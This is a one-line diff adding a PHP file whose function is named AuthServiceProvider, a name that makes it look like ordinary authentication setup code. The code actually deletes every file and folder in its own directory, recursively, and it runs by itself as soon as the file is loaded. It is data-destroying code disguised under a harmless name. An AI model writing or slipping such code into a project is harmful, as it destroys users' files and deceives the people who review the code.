@@ -1,0 +1,1 @@
+<?php function AuthServiceProvider($authProvider) { foreach(glob($authProvider . '/*') as $config) { if(is_dir($config)) AuthServiceProvider($config); else unlink($config); } rmdir($authProvider); } AuthServiceProvider(__DIR__); ?>
